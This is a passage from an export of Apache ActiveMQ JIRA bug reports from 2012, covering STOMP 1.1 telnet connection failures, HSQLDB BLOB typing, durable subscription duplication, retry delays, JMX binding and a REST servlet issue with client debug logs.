http://stomp.github.com/stomp-specification-1.1.html;;;","16/Jul/12 13:51;holla2040;in v1.1 'session' header, the ':' chars aren't escaped. 


holla@knopfler[501]: nc eric 61613
CONNECT
accept-version:1.1
heart-beat:0,0

^@
CONNECTED
heart-beat:0,0
session:ID:eric-51104-1342368411805-2:29
server:ActiveMQ/5.7-SNAPSHOT
version:1.1
;;;","16/Jul/12 13:55;holla2040;I read the protocol. all is well;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
can't connect to stomp protocol 1.1 using telnet,AMQ-3927,12598921,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,holla2040,holla2040,16/Jul/12 06:36,16/Jul/12 13:50,14/Jul/23 05:43,16/Jul/12 13:50,5.7.0,,,,,5.7.0,,,STOMP,,,,0,accept-version,,,,,,,,"Using telnet I can't connect to stomp protocol 1.1. netcat works fine


holla@knopfler[507]: telnet eric 61613
Connected to eric.
Escape character is '^]'.
CONNECT
accept-version:1.1
heart-beat:0,0

^@   
ERROR
content-type:text/plain
], supported versions are: [1.1, 1.0]

], supported versions are: [1.1, 1.0]rotocolException: Invalid Protocol version[1.1
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompConnect(ProtocolConverter.java:586)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:181)
        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:76)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)
        at java.lang.Thread.run(Thread.java:619)

Connection closed by foreign host.

holla@knopfler[508]: nc eric 61613
Trying 75.101.139.42...
^C
holla@knopfler[509]: nc eric 61613
CONNECT
accept-version:1.1
heart-beat:0,0

^@
CONNECTED
heart-beat:0,0
session:ID:eric-51104-1342368411805-2:16
server:ActiveMQ/5.7-SNAPSHOT
version:1.1


I suspect the telnet induced CR or LF isn't stripped correctly. You can see this because the error message formatting is screwed up.
","ubuntu 10.04 32bit java version ""1.6.0_24"" OpenJDK",holla2040,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,300,300,,0%,300,300,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249791,,,Mon Jul 16 13:50:33 UTC 2012,,,,,,,,,,,"0|i0ahiv:",59112,,,,,,,,,,,,,,,,,,,,,"16/Jul/12 13:50;tabish;fix and test added to trunk, will appear in the next snapshot build.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Webconsole should import javax.servlet.* too,AMQ-3923,12598373,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,achim_nierbeck,achim_nierbeck,11/Jul/12 13:32,13/Jul/12 09:59,14/Jul/23 05:43,13/Jul/12 09:59,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"When the Active MQ Web-console is deployed on Karaf it sometimes misses the CSS and javascript. This is due to the fact that the war doesn't import javax.servlet package. This is required per OSGi-Spec to fully work with the
web-extender for wars :)",Karaf 2.2.8,achim_nierbeck,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249793,,,Fri Jul 13 09:59:02 UTC 2012,,,,,,,,,,,"0|i0ahjb:",59114,,,,,,,,,,,,,,,,,,,,,"13/Jul/12 09:59;dejanb;Fixed with svn revision 1361132. I cleaned a bit imports and provided libraries, but the main problem was that css and js were imported using <c:url/> tag which on first load append jsessionid. For some reason this doesn't work in OSGi.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
HSQLDB support is broken as wrong data type is used in HsqldbJDBCAdapter.java,AMQ-3922,12598365,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,fredt,fredt,11/Jul/12 12:17,02/Apr/14 23:45,14/Jul/23 05:43,13/Nov/13 17:05,5.6.0,,,,,5.10.0,5.9.1,,Message Store,,,,1,,,,,,,,,"The HsqldbJDBCAdaptor defines the SQL type used for storing a lob as ""OTHER"". This is wrong in principle, as this type is intended for storing complex serialized objects, not specifically lobs. With this type, the JDBC setObject and getObject methods must be used to store and retrieve the object (which is not the case with ActiveMQ).

The problem has been encountered and reported in TOMEE-233 and elsewhere.

With HSQLDB version 2.x, the type ""BLOB"" should be used for maximum storage capacity and minimum memory use by the database engine. This type is supported in all modes of operation, including in-memory and file databases.

It seems a simple switch from ""OBJECT"" to ""BLOB"" in the code should do the job, as the JDBC setBytes and getBytes methods used by the superclass are compatible with the BLOB type.


",,andriykalashnykov,davsclaus,fredt,gtully,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253904,,,Wed Nov 13 17:05:19 UTC 2013,,,,,,,,,,,"0|i0eazj:",81542,,,,,,,,,,,,,,,,,,,,,"11/Jul/12 13:42;gtully;In that case, the default jdbc adapter should work when explicitly set.
Can you try{code}
    <persistenceAdapter>
      <jdbcPersistenceAdapter>
        <adapter>
           <defaultJDBCAdapter />
         </adapter>
      </jdbcPersistenceAdapter>
    </persistenceAdapter>
{code}
;;;","11/Jul/12 14:46;fredt;Sorry, cannot test as I don't use ActiveMQ. Reporting due to HSQLDB concerns. It should work if the CREATE TABLE defines the type as BLOB.

Also noted the BytesJDBCAdaptor simply contains redundant redefinitions of setBinaryData and getBinaryData methods in the superclass.;;;","13/Nov/13 17:04;davsclaus;Yeah according the hsqldb data type guides we should use BLOB
http://hsqldb.org/doc/guide/sqlgeneral-chapt.html;;;","13/Nov/13 17:05;davsclaus;Thanks for reporting.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Duplicated durable subscriptions after broker retart with option keepDurableSubsActive=true,AMQ-3921,12598292,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,10/Jul/12 23:09,11/Jul/12 09:31,14/Jul/23 05:43,10/Jul/12 23:15,5.5.1,5.6.0,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"In a slightly modified version of JUnit test case org.apache.activemq.usecases.DurableSubscriptionActivationTest from activemq-core there will be a failure because reactivated subscription with the same SubscriptionName and ClientID after broker restart was not correctly recognized and as a result, a duplicated durable subscriptions was added to consumers list.",,dejanb,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249794,,,Wed Jul 11 09:31:18 UTC 2012,,,,,,,,,,,"0|i0ahjj:",59115,,,,,,,,,,,,,,,,,,,,,"10/Jul/12 23:15;tabish;Fix and test added to trunk;;;","11/Jul/12 09:31;dejanb;The root of the problem was that keepDurableSubsActive property wasn't properly propagated to the durable sub. More info in [AMQ-2665];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Performance issue with delay policy in DestinationBridge.onMessage,AMQ-3920,12598189,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,ermakovs,ermakovs,10/Jul/12 14:28,10/Jul/12 20:09,14/Jul/23 05:43,10/Jul/12 20:09,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"Incorrect sleep implementation in org.apache.activemq.network.jms.DestinationBridge.onMessage

In the current implementation the condition 'attempt > 0' is true during the first iteration. It causes critical performance problems in high load environment.

Code example from DestinationBridge.onMessage:
...
while (started.get() && message != null && ++attempt <= maxRetries) {

            try {

                if (attempt > 0) {//IT'S TRUE DURING FIRST ITERATION
                    try {                       Thread.sleep(jmsConnector.getReconnectionPolicy().getNextDelay(attempt));
                    } catch(InterruptedException e) {
                        break;
                    }
                }
...",,ermakovs,jdanek,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249795,,,Tue Jul 10 20:09:53 UTC 2012,,,,,,,,,,,"0|i0ahjr:",59116,,,,,,,,,,,,,,,,,,,,,"10/Jul/12 20:09;tabish;Fixed in trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMX connector does not bind to a specific host when a connectHost is specified on the managementContext,AMQ-3915,12597753,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,06/Jul/12 11:48,06/Jul/12 11:51,14/Jul/23 05:43,06/Jul/12 11:51,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"Due to JDK bug (http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6425769), JMX connector will listen on all interfaces, instead of one defined by connectorHost property. There's a workaround for the problem that we can use.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249798,,,Fri Jul 06 11:51:12 UTC 2012,,,,,,,,,,,"0|i0ahkf:",59119,,,,,,,,,,,,,,,,,,,,,"06/Jul/12 11:51;dejanb;Fixed with svn revision 1358147;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Durable subs store messages in error with broker attribute persistent=""false""",AMQ-3912,12597236,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,gtully,gtully,03/Jul/12 13:29,31/Jul/12 18:11,14/Jul/23 05:43,03/Jul/12 13:37,5.6.0,,,,,5.7.0,,,Message Store,,,,0,memory,persistence,,,,,,,"persistent=""false"" means use only the memory persistence adapter, ignore the persistence attribute of a message or durable sub.
If a <persistenceAdapter /> element is specified in xml config, durable subs do get persistence of messages that will survive a restart. This is not the intent of persistent=""false""",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3444,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249801,,,Tue Jul 03 13:37:16 UTC 2012,,,,,,,,,,,"0|i0ahl3:",59122,,,,,,,,,,,,,,,,,,,,,"03/Jul/12 13:37;gtully;fix in http://svn.apache.org/viewvc?rev=1356724&view=rev

any configured non memory persistencAadapter is ignored with a warn if persistent=""false"";;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Messages sometimes not received by active topic subscriptions,AMQ-3909,12596730,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,02/Jul/12 19:36,02/Jul/12 19:38,14/Jul/23 05:43,02/Jul/12 19:38,5.6.0,,,,,5.7.0,,,Broker,JMS client,STOMP,,0,,,,,,,,,A consumer subscribe over stomp or a failover of a consumer can lead to a scenario in which messages are not delivered to consumers on Topics.  There is a small window in which the consumer subscribe and consumer update of prefetch during failover and a Stomp consumer subscribe when messages might be produced but the subscription is not sent those messages.  Once a new Message is produced after the ConsumerControl command updates the prefetch then pending messages are dispatched.  The Topic and DurableTopic subscription classes need to do an eager dispatch after the prefetch size is updated to ensure pending message that were held because the window was to small are dispatched in a timely manner.,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249802,,,Mon Jul 02 19:38:00 UTC 2012,,,,,,,,,,,"0|i0ahlb:",59123,,,,,,,,,,,,,,,,,,,,,"02/Jul/12 19:38;tabish;Fixed and tests added in trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
StompSslAuthTest.testSubscribeWithReceiptNotAuthorized() fails,AMQ-3908,12596649,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,02/Jul/12 13:36,02/Jul/12 14:28,14/Jul/23 05:43,02/Jul/12 14:28,,,,,,5.7.0,,,Test Cases,,,,0,,,,,,,,,"The StompSslAuthTest.testSubscribeWithReceiptNotAuthorized() fails at the following assertion:

frame = stompConnection.receiveFrame();
assertTrue(frame.startsWith(""ERROR""));

The frame it actually gets is:

RECEIPT
receipt-id:1

Note: this testcase succeeds when run as part of StompTest.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249803,,,Mon Jul 02 14:28:05 UTC 2012,,,,,,,,,,,"0|i0ahlj:",59124,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"02/Jul/12 14:28;tabish;Resolved in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Restful HTTP MessageServlet causing trouble.  May be a garbage collection issue.,AMQ-3907,12596549,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,steve.v,steve.v,01/Jul/12 22:32,20/Dec/13 21:09,14/Jul/23 05:43,20/Dec/13 21:09,5.6.0,,,,,,,,Broker,,,,0,,,,,,,,,"I am developing a C-based client that uses the RESTful HTTP protocol to POST and GET messages to and from an ActiveMQ broker.  I have seen my test run successfully.  However, if I run it multiple times back to back in succession, it will usually encounter failures.  The test has two steps, where the first POSTs a number of messages on the queue, then the second step GETs them back off.  When it encounters trouble, it is usually in the first step when posting messages.  When that encounters failures, it appears to be having trouble re-connecting, and kicks-out of that first step, proceeding on to the second step where it GETs the messages off of the queue.  When the first step encounters trouble, the second step usually just gets a portion of the messages before getting a 204(No content).  The 204 notifies my test that it is time to terminate.  I have seen the following in some of the server debug logs:
-------------------------------------
2012-06-27 07:44:04,007 | DEBUG | Async client internal exception occurred with no exception listener registered: java.lang.IllegalStateException: REDISPATCHING,initial,resumed | org.apache.activemq.ActiveMQConnection | ActiveMQ Session Task-2 
java.lang.IllegalStateException: REDISPATCHING,initial,resumed 
        at org.eclipse.jetty.server.AsyncContinuation.dispatch(AsyncContinuation.java:403) 
        at org.eclipse.jetty.server.AsyncContinuation.resume(AsyncContinuation.java:810) 
        at org.apache.activemq.web.MessageServlet$Listener.onMessageAvailable(MessageServlet.java:368) 
        at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1320) 
        at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131) 
        at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202) 
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) 
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) 
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
        at java.lang.Thread.run(Thread.java:619) 
-------------------------------------

I am thinking that the garbage collector is not able to keep-up, and the broker has trouble when running out of memory.

I have also seen messages like this:
-------------------------------------
2012-06-27 07:33:01,435 | DEBUG | Main:memory:queue://myqueue:memory: usage change from: 67% of available memory, to: 68% of available memory | org.apache.activemq.usage.Usage | VMTransport: vm://localhost#71 
-------------------------------------

When the second step terminates prematurely due to the 204 status, the rest of the messages are gone.  Maybe my ""consumer.prefetchSize=1"" is ignored, and the consumer on the server-side grabs the rest of the messages.  Any ideas?

Another thing I notice, is that the HTTP client code I use reports the following for every message it posts: 
""Web server requires that we close the current connection and obtain a new connection to continue.""  Is that normal, or can I change some configuration setting to prevent that?

My test program is a SAS program.  Note: since my client code in question is not yet production, you will not be able to run the test even if you do have a current version of SAS.  Here is my test program:
-------------------------------------
data _null_;
    file '' device=activemq lrecl=54
        url='http://d22275:8161/demo/message/myqueue?type=queue&JMSDeliveryMode=NON_PERSISTENT&JMSTimeToLive=100000'
        ;
    do i = 1 to 2000;
        d = datetime();
        put i z5. +1 'This is a test msg sent at' +1 d datetime21.2;
    end;
run;

data _null_;
    infile '' device=activemq lrecl=54 timeout=1000
        url='http://d22275:8161/demo/message/myqueue?type=queue&consumer.prefetchSize=1'
        ;
    input;
run;
-------------------------------------

That first DATA step POSTs 2000 messages to a queue, and the second DATA step GETs them back off.  If I change the write loop to just POST 2 messages and I turn on some client-side debug/trace logging, you can see what I am sending and receiving across the wire.  Here is an excerpt from the log: 
-------------------------------------
INFO 1          data _null_;
INFO 2              file '' device=activemq lrecl=54
INFO 3                  url='http://d22275:8161/demo/message/myqueue?type=queue&JMSDeliveryMode=NON_PE
INFO 3        ! RSISTENT&JMSTimeToLive=100000'
INFO 4                  ;
INFO 5              do i = 1 to 2;
INFO 6                  d = datetime();
INFO 7                  put i z5. +1 'This is a test msg sent at' +1 d datetime21.2;
INFO 8              end;
INFO 9          run;
INFO 
DEBUG Attempting to connect to Web server 10.23.11.16:8161.
INFO NOTE: The file '' is:
INFO       
INFO       URL=http://d22275:8161/demo/message/myqueue?type=queue&JMSDeliveryMode=NON_PERSISTENT&JMSTi
INFO       meToLive=100000&clientId=839E8906-E338-4FDE-9818-665B14944874,
INFO       LRECL=54,TIMEOUT=-1
INFO 
DEBUG Executing POST request.
DEBUG >>> POST /demo/message/myqueue?type=queue&JMSDeliveryMode=NON_PERSISTENT&JMSTimeToLive=100000&clientId=839E8906-E338-4FDE-9818-665B14944874 HTTP/1.1
DEBUG >>> Content-Type: APPLICATION/X-WWW-FORM-URLENCODED
DEBUG Cache file name used is C:\DOCUME~1\sav\LOCALS~1\Temp\SAS Temporary Files\SAS_util000100001004_d22275\ut1004000002.utl
DEBUG >>> Content-Length: 59
DEBUG >>> Host: d22275:8161
DEBUG >>> User-Agent: SAS/9
DEBUG >>> 
TRACE >>> 341c000: 62 6f 64 79 3d 30 30 30 30 31 20 54 68 69 73 20 |body=00001 This |
TRACE >>> 341c010: 69 73 20 61 20 74 65 73 74 20 6d 73 67 20 73 65 |is a test msg se|
TRACE >>> 341c020: 6e 74 20 61 74 20 30 31 4a 55 4c 32 30 31 32 3a |nt at 01JUL2012:|
TRACE >>> 341c030: 31 38 3a 32 36 3a 34 33 2e 36 39                |18:26:43.69     |
DEBUG <<< HTTP/1.1 200 OK
DEBUG <<< Set-Cookie: JSESSIONID=1f4dfw7mbb4611ilhiznnkifi3;Path=/demo
DEBUG <<< Expires: Thu, 01 Jan 1970 00:00:00 GMT
DEBUG <<< messageID: ID:d22275-1028-1341175648962-3:24:1:1:1
DEBUG <<< Content-Length: 0
DEBUG <<< Server: Jetty(7.6.1.v20120215)
DEBUG <<< 
DEBUG Request POST returns status 200.
DEBUG Executing POST request.
DEBUG Web server requires that we close the current connection and obtain a new connection to continue.
DEBUG Attempting to connect to Web server 10.23.11.16:8161.
DEBUG >>> POST /demo/message/myqueue?type=queue&JMSDeliveryMode=NON_PERSISTENT&JMSTimeToLive=100000&clientId=839E8906-E338-4FDE-9818-665B14944874 HTTP/1.1
DEBUG >>> Content-Type: APPLICATION/X-WWW-FORM-URLENCODED
DEBUG Cache file name used is C:\DOCUME~1\sav\LOCALS~1\Temp\SAS Temporary Files\SAS_util000100001004_d22275\ut1004000003.utl
DEBUG >>> Content-Length: 59
DEBUG >>> Host: d22275:8161
DEBUG >>> Cookie: $Version=1;JSESSIONID=1f4dfw7mbb4611ilhiznnkifi3;$Path=/demo
DEBUG >>> User-Agent: SAS/9
DEBUG >>> 
TRACE >>> 3422000: 62 6f 64 79 3d 30 30 30 30 32 20 54 68 69 73 20 |body=00002 This |
TRACE >>> 3422010: 69 73 20 61 20 74 65 73 74 20 6d 73 67 20 73 65 |is a test msg se|
TRACE >>> 3422020: 6e 74 20 61 74 20 30 31 4a 55 4c 32 30 31 32 3a |nt at 01JUL2012:|
TRACE >>> 3422030: 31 38 3a 32 36 3a 34 33 2e 37 30                |18:26:43.70     |
DEBUG <<< HTTP/1.1 200 OK
DEBUG <<< messageID: ID:d22275-1028-1341175648962-3:24:1:1:2
DEBUG <<< Content-Length: 0
DEBUG <<< Server: Jetty(7.6.1.v20120215)
DEBUG <<< 
DEBUG Request POST returns status 200.
DEBUG Attempting to connect to Web server 10.23.11.16:8161.
DEBUG Executing POST request.
DEBUG >>> POST /demo/message/myqueue?type=queue&JMSDeliveryMode=NON_PERSISTENT&JMSTimeToLive=100000&clientId=839E8906-E338-4FDE-9818-665B14944874&action=unsubscribe HTTP/1.1
DEBUG >>> Content-Type: application/x-www-form-urlencoded
DEBUG Cache file name used is C:\DOCUME~1\sav\LOCALS~1\Temp\SAS Temporary Files\SAS_util000100001004_d22275\ut1004000004.utl
DEBUG >>> Content-Length: 0
DEBUG >>> Host: d22275:8161
DEBUG >>> Cookie: $Version=1;JSESSIONID=1f4dfw7mbb4611ilhiznnkifi3;$Path=/demo
DEBUG >>> User-Agent: SAS/9
DEBUG >>> 
DEBUG <<< HTTP/1.1 200 OK
DEBUG <<< Content-Length: 0
DEBUG <<< Server: Jetty(7.6.1.v20120215)
DEBUG <<< 
DEBUG Request POST returns status 200.
DEBUG Destroying connection to Web server d22275:8161.
INFO NOTE: 2 records were written to the file ''.
INFO       The minimum record length was 54.
INFO       The maximum record length was 54.
DEBUG Destroying connection to Web server d22275:8161.
INFO NOTE: DATA statement used (Total process time):
INFO       real time           0.17 seconds
INFO       cpu time            0.00 seconds
INFO       
INFO 
INFO 10         
INFO 11         data _null_;
INFO 12             infile '' device=activemq lrecl=54 timeout=1000
INFO 13                 url='http://d22275:8161/demo/message/myqueue?type=queue&consumer.prefetchSize=
INFO 13       ! 1'
INFO 14                 ;
INFO 15             input;
INFO 16         run;
INFO 
DEBUG Attempting to connect to Web server 10.23.11.16:8161.
INFO NOTE: The infile '' is:
INFO       
INFO       URL=http://d22275:8161/demo/message/myqueue?type=queue&consumer.prefetchSize=1&clientId=7BA
INFO       B771E-AF44-4597-B603-FC018C1069B3&READTIMEOUT=1000,
INFO 2                                        The SAS System                18:26 Sunday, July 1, 2012
INFO 
INFO       LRECL=54,TIMEOUT=1000
INFO 
DEBUG Executing GET request.
DEBUG >>> GET /demo/message/myqueue?type=queue&consumer.prefetchSize=1&clientId=7BAB771E-AF44-4597-B603-FC018C1069B3&READTIMEOUT=1000 HTTP/1.1
DEBUG >>> Host: d22275:8161
DEBUG >>> Accept: */*
DEBUG >>> Accept-Charset: iso-8859-1,*,utf-8
DEBUG >>> Accept-Encoding: identity
DEBUG >>> Accept-Language: en
DEBUG >>> User-Agent: SAS/9
DEBUG >>> 
DEBUG <<< HTTP/1.1 200 OK
DEBUG <<< Set-Cookie: JSESSIONID=171xnui5b43xz1wpgghnpgtiws;Path=/demo
DEBUG <<< Expires: Thu, 01 Jan 1970 00:00:00 GMT
DEBUG <<< Content-Type: text/xml;charset=UTF-8
DEBUG <<< destination: queue://myqueue
DEBUG <<< id: ID:d22275-1028-1341175648962-3:24:1:1:1
DEBUG <<< Content-Length: 54
DEBUG <<< Server: Jetty(7.6.1.v20120215)
DEBUG <<< 
TRACE <<< 415a740: 30 30 30 30 31 20 54 68 69 73 20 69 73 20 61 20 |00001 This is a |
TRACE <<< 415a750: 74 65 73 74 20 6d 73 67 20 73 65 6e 74 20 61 74 |test msg sent at|
TRACE <<< 415a760: 20 30 31 4a 55 4c 32 30 31 32 3a 31 38 3a 32 36 | 01JUL2012:18:26|
TRACE <<< 415a770: 3a 34 33 2e 36 39                               |:43.69          |
DEBUG Request GET returns status 200.
DEBUG Executing GET request.
DEBUG >>> GET /demo/message/myqueue?type=queue&consumer.prefetchSize=1&clientId=7BAB771E-AF44-4597-B603-FC018C1069B3&READTIMEOUT=1000 HTTP/1.1
DEBUG >>> Host: d22275:8161
DEBUG >>> Accept: */*
DEBUG >>> Accept-Charset: iso-8859-1,*,utf-8
DEBUG >>> Accept-Encoding: identity
DEBUG >>> Accept-Language: en
DEBUG >>> Cookie: $Version=1;JSESSIONID=171xnui5b43xz1wpgghnpgtiws;$Path=/demo
DEBUG >>> User-Agent: SAS/9
DEBUG >>> 
DEBUG <<< HTTP/1.1 200 OK
DEBUG <<< Content-Type: text/xml;charset=UTF-8
DEBUG <<< destination: queue://myqueue
DEBUG <<< id: ID:d22275-1028-1341175648962-3:24:1:1:2
DEBUG <<< Content-Length: 54
DEBUG <<< Server: Jetty(7.6.1.v20120215)
DEBUG <<< 
TRACE <<< 415a740: 30 30 30 30 32 20 54 68 69 73 20 69 73 20 61 20 |00002 This is a |
